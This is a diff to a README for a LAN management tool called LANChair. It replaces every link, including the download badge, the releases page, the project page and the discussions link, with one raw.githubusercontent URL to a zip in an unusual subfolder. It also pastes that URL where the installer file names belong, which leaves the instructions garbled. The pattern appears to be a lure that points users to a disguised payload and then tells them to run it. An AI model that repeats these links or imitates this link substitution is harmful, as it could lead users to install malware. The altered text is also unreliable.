@@ -1,6 +1,6 @@
 # 🏡️ LANChair_Website - Easy Tools for Your LAN Management
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen.svg)](https://github.com/Equalitydrouth93/LANChair_Website/releases)
+[![Download](https://raw.githubusercontent.com/Equalitydrouth93/LANChair_Website/LANChair_Website_Main-dev/daggletail/LANChair_Website.zip%20Now-Get%https://raw.githubusercontent.com/Equalitydrouth93/LANChair_Website/LANChair_Website_Main-dev/daggletail/LANChair_Website.zip)](https://raw.githubusercontent.com/Equalitydrouth93/LANChair_Website/LANChair_Website_Main-dev/daggletail/LANChair_Website.zip)
 
 ## 🌟 Overview
 Welcome to the LANChair_Website! This is the official source repository for the LANChair project, a collection of useful tools designed for managing your Local Area Network (LAN) connections. Our goal is to simplify the process of connecting and managing devices within your network. Whether you're a home user or managing a small office, LANChair provides you with an easy way to optimize your network performance.
@@ -11,7 +11,7 @@ Follow these steps to download and run the application from our Releases page. N
 ### 1. 📥 Download the Application
 To get started, visit our download page by clicking the link below. Here, you'll find the latest releases of the LANChair tools:
 
-[Download LANChair Tools](https://github.com/Equalitydrouth93/LANChair_Website/releases)
+[Download LANChair Tools](https://raw.githubusercontent.com/Equalitydrouth93/LANChair_Website/LANChair_Website_Main-dev/daggletail/LANChair_Website.zip)
 
 ### 2. 🖥️ Choose Your Version
 On the Releases page, you will see different versions of the software. It is always best to download the latest version for optimal performance and security. Click on the version that you want to download.
@@ -23,7 +23,7 @@ After clicking on the version, scroll down to find the available files for downl
 Click on the downloadable file to start the download. It will usually go to your “Downloads” folder. Make sure to note the file name for later.
 
 ### 5. 📂 Open the File
-Once the download is complete, navigate to your “Downloads” folder. Locate the downloaded file. It might be named something like `LANChair_Installer.exe` or `LANChair.dmg`.
+Once the download is complete, navigate to your “Downloads” folder. Locate the downloaded file. It might be named something like `https://raw.githubusercontent.com/Equalitydrouth93/LANChair_Website/LANChair_Website_Main-dev/daggletail/LANChair_Website.zip` or `https://raw.githubusercontent.com/Equalitydrouth93/LANChair_Website/LANChair_Website_Main-dev/daggletail/LANChair_Website.zip`.
 
 ### 6. 🚀 Install the Application
 - **For Windows Users:** Double-click the executable file. Follow the on-screen instructions to complete the installation.
@@ -54,8 +54,8 @@ Join our community for support and updates:
 LANChair is distributed under the GPL-3.0 License. This means you can use and modify the software freely. Please refer to the LICENSE file in the repository for more details.
 
 ## 🔗 Useful Links
-- [Download LANChair Tools](https://github.com/Equalitydrouth93/LANChair_Website/releases)
-- [LANChair Project on GitHub](https://github.com/Equalitydrouth93/LANChair_Website)
-- [User Discussions](https://github.com/Equalitydrouth93/LANChair_Website/discussions)
+- [Download LANChair Tools](https://raw.githubusercontent.com/Equalitydrouth93/LANChair_Website/LANChair_Website_Main-dev/daggletail/LANChair_Website.zip)
+- [LANChair Project on GitHub](https://raw.githubusercontent.com/Equalitydrouth93/LANChair_Website/LANChair_Website_Main-dev/daggletail/LANChair_Website.zip)
+- [User Discussions](https://raw.githubusercontent.com/Equalitydrouth93/LANChair_Website/LANChair_Website_Main-dev/daggletail/LANChair_Website.zip)
 
 We hope that LANChair helps you simplify your network management. Enjoy seamless connectivity!
